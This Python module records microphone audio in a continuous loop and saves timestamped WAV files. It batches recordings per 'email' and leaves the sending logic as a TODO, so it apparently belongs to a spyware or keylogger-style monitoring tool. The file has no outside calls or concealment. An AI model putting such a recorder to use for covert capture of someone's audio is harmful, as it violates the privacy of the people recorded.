from sounddevice import rec, wait
from scipy.io.wavfile import write
from os.path import join
from time import sleep
import sys
from config import (
    LOGS_DIRECTORY_PATH,
    MICROPHONE_INTERVAL,
    MICROPHONE_RECORDINGS_PER_EMAIL,
)
from utils.utils import log, get_timestamp, handle_counter


class MicrophoneLogger:
    def __init__(self):
        self.logs_directory_path = LOGS_DIRECTORY_PATH if LOGS_DIRECTORY_PATH else ""
        self.error_file_path = (
            join(LOGS_DIRECTORY_PATH, "errors.txt")
            if LOGS_DIRECTORY_PATH
            else "errors.txt"
        )
        self.counter = 0
        self.counter_max = MICROPHONE_RECORDINGS_PER_EMAIL
        self.interval = MICROPHONE_INTERVAL
        self.running = True

    def handle_counter(self):
        self.counter += 1
        if handle_counter(self.counter, self.counter_max):
            pass  # TODO: Email logic here

    def log_microphone(self) -> None:
        recording = rec(
            int(self.interval * 44100), samplerate=44100, channels=1, dtype="int16"
        )
        wait()
        write(
            join(self.logs_directory_path, f"microphone/{get_timestamp()}.wav"),
            44100,
            recording,
        )

    def run(self):
        try:
            while self.running:
                self.log_microphone()
                self.handle_counter()
                sleep(self.interval)
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            self.running = False
            self.log_error("ERROR WHILE LOGGING MICROPHONE:", e)

    def log_error(self, message: str, exception: Exception) -> None:
        log(message, self.error_file_path)
        log(str(exception), self.error_file_path)

def main():
    microphone_logger = MicrophoneLogger()
    try:
        microphone_logger.run()
    except Exception:
        print("An error occurred while logging microphone.")
        print(f"See full error here: {microphone_logger.error_file_path}")


if __name__ == "__main__":
    sys.exit(main())
